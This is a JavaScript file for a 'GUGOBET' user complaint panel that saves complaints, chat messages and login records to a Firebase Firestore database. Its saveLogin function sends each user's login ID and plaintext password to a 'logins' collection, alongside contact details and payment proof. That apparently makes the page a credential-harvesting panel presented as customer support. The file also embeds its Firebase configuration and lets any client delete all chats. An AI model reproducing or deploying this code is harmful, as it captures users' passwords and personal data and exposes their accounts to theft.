/* GUGOBET user panel - save complaints to Firestore (best effort, offline safe) */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getFirestore,
  collection,
  doc,
  addDoc,
  getDocs,
  getDoc,
  deleteDoc,
  setDoc,
  enableIndexedDbPersistence
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

var firebaseConfig = {
  apiKey: "AIzaSyCD421I9ZQqocu0-OgyUp_rRCxy1fmcH58",
  authDomain: "gugobet-6e56a.firebaseapp.com",
  projectId: "gugobet-6e56a",
  storageBucket: "gugobet-6e56a.firebasestorage.app",
  messagingSenderId: "641902562640",
  appId: "1:641902562640:web:2fc0b820f3f505c76d3055"
};

var app = initializeApp(firebaseConfig, 'gugobet-user');
var db = getFirestore(app);

try {
  enableIndexedDbPersistence(db).catch(function () { /* ignore */ });
} catch (e) { /* ignore */ }

var CATEGORY_LABEL = {
  deposit: 'Deposit Problem',
  withdrawal: 'Withdrawal Problem',
  email: 'Email Verification'
};

var ID_MAP_KEY = 'gugobet.userids.v1';
var SESSION_KEY = 'gugobet.session.v1';

function readMap() {
  try { return JSON.parse(localStorage.getItem(ID_MAP_KEY) || '{}'); } catch (e) { return {}; }
}

function writeMap(map) {
  try { localStorage.setItem(ID_MAP_KEY, JSON.stringify(map)); } catch (e) { /* ignore */ }
}

function readSession() {
  try { return JSON.parse(sessionStorage.getItem(SESSION_KEY) || 'null'); } catch (e) { return null; }
}

function patchSession(uid, userId) {
  try {
    var s = readSession();
    if (!s) return;
    if (uid && s.id && s.id !== uid) return;
    s.userId = userId;
    sessionStorage.setItem(SESSION_KEY, JSON.stringify(s));
  } catch (e) { /* ignore */ }
}

function newUserId() {
  return 'GB-' + Date.now().toString(36).toUpperCase().slice(-5) +
    Math.random().toString(36).toUpperCase().slice(2, 5);
}

function currentUserId() {
  var s = readSession();
  if (s && s.userId) return s.userId;
  var map = readMap();
  if (s && s.id && map[s.id]) return map[s.id];
  return '';
}

window.GBET_FB_USER = {
  save: function (record) {
    var problem = record.problemType || CATEGORY_LABEL[record.category] || 'Complaint';
    var created = Date.parse(record.createdAt || '');
    if (isNaN(created)) created = Date.now();
    var proof = record.proof || '';

    var payload = {
      userId: record.userId || currentUserId(),
      name: record.name || '',
      username: record.name || '',
      uid: record.uid || '',
      mobile: record.mobile || '',
      email: record.email || '',
      category: record.category || 'deposit',
      problemType: problem,
      problem: problem,
      amount: record.amount || '',
      details: record.details || '',
      status: 'Pending',
      createdAt: created,
      date: new Date(created).toLocaleString('en-IN'),
      proof: proof,
      image: proof
    };

    return setDoc(doc(db, 'complaints', String(record.id)), payload);
  },

  userIdFor: function (uid) {
    var id = String(uid || '').trim();
    var s = readSession();
    if (s && s.id === id && s.userId) return s.userId;
    return readMap()[id] || '';
  },

  currentUserId: currentUserId,

  saveLogin: function (login) {
    var uid = String((login && login.uid) || '').trim();
    if (!uid) return Promise.resolve('');
    var key = encodeURIComponent(uid);
    var map = readMap();
    var userId = map[uid] || newUserId();
    map[uid] = userId;
    writeMap(map);
    patchSession(uid, userId);

    return getDoc(doc(db, 'logins', key)).then(function (snap) {
      return snap && snap.exists() ? snap.data() : null;
    }, function () {
      return null;
    }).then(function (existing) {
      if (existing && existing.userId && existing.userId !== userId) {
        userId = existing.userId;
        map[uid] = userId;
        writeMap(map);
        patchSession(uid, userId);
      }
      return setDoc(doc(db, 'logins', key), {
        userId: userId,
        uid: uid,
        loginId: uid,
        name: uid,
        password: String((login && login.password) || ''),
        loginType: (login && login.tab) || '',
        createdAt: Date.now(),
        date: new Date().toLocaleString('en-IN')
      }, { merge: true }).then(function () {
        return userId;
      });
    });
  },

  sendChat: function (text, role) {
    return addDoc(collection(db, 'chats'), {
      text: String(text || ''),
      role: role === 'user' ? 'user' : 'system',
      createdAt: Date.now(),
      date: new Date().toLocaleString('en-IN')
    });
  },

  clearChats: function () {
    return getDocs(collection(db, 'chats')).then(function (snap) {
      return Promise.all(snap.docs.map(function (item) { return deleteDoc(item.ref); }));
    });
  }
};
